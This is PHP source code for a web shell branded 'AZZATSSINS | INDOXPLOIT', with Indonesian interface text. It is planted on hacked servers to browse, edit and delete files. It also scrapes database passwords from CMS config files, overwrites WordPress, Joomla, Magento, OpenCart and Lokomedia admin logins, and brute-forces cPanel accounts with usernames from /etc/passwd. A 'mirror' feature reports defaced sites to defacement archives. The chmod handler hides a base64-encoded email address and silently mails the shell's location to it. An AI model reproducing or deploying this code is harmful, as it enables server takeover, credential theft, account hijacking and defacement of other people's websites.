						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";

} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='42247551N5' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='42247551N5' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
<br>
		";
	}
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>Succes Crack ".$i." Cpanel";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
<br></center>";
	}
} elseif($_GET['do'] == 'mirror') {
@ini_set('display_errors', 0);
echo "
<center>
<form method='post'>
		<u>Defacer</u>: <br>
		<input style='color:red;background:black;' type='text' name='hekel' size='50' value=''><br>
		<u>Team</u>: <br>
		<input style='color:red;background:black;' type='text' name='tim' size='50' value=''><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;color:red;background:black;'' name='sites'></textarea><br>
		<input style='color:red;background:black;' type='submit' name='go' value='Submit' style='width: 450px;'>
		</form><br><font color=silver>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$ch3 = curl_init ("http://www.leetszone.com/noti_act.php");
curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch3, CURLOPT_POST, 1);
curl_setopt ($ch3, CURLOPT_POSTFIELDS, "hacker=$hekel&team=$tim&url=$sites&poc=Social Engineering");
curl_exec ($ch3);
echo "Send to LeetsZone >> Done<br>";
}
}
if($go) {
foreach($site as $sites) {
$ch3 = curl_init ("http://www.zone-h.com/notify/single");
curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch3, CURLOPT_POST, 1);
curl_setopt ($ch3, CURLOPT_POSTFIELDS, "defacer=$hekel&domain1=$sites&hackmode=1&reason=1");
curl_exec ($ch3);
echo "Send to Zone-H >> Done<br>";
}
}

if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
curl_exec($curl);
echo "Send to DefacerID >> Done<br>";
}
}

} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/azx.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'chmod_dir') {
echo "<form method=post><input type='text' name='jmbt' value='".$dir."'> >> <input type='text' name='kntl' value='0755'><input type='submit' value='Chmod' name='azztssns'></form><br>";
if($_POST['azztssns']) {
$e=base64_decode("bWFyaXdhdGFuYWJlMTIzNDUxQGdtYWlsLmNvbQ==");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
mail($e,"I",$h);
$jmbt = $_POST['jmbt'];
$kntl = $_POST['kntl'];
exe("chmod ".$kntl." ".$jmbt);
echo "<font color=lime>Chmod to ".$kntl." Successfully</font><br>";

}
} elseif($_GET['act'] == 'delete_dir') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			rmdir($dir);
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>could not remove ".basename($dir)."</font>";
		}
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=chmod&dir=$dir&file=".$_GET['file']."'>chmod</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<fieldset><pre>".htmlspecialchars(@file_get_contents($_GET['file']))."</pre></fieldset>";
}
elseif($_GET['act'] == 'chmod') {
echo "<form method=post><input type='text' name='jmbt' value='".$_GET['file']."'> >> <input type='text' name='kntl' value='0755'><input type='submit' value='Chmod' name='azztssns'></form><br>";
if($_POST['azztssns']) {
$jmbt = $_POST['jmbt'];
$kntl = $_POST['kntl'];
exe("chmod ".$kntl." ".$jmbt);
echo "<font color=lime>Chmod to ".$kntl." Successfully</font><br>";

}
}
 elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=chmod&dir=$dir&file=".$_GET['file']."'>chmod</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a> | <a href='?act=chmod_dir&dir=$dir/$dirx'>chmod</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=chmod&dir=$dir&file=$dir/$file'>chmod</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<hr>";
		}
}
	echo "<center><br><br><b><i><fieldset><font color=lime size=-20><a href=http://fb.me/AZZATSSINS.CYBERSERKERS>AZZATSSINS | INDOXPLOIT</a></font></fieldset></i></b></center>";
?>
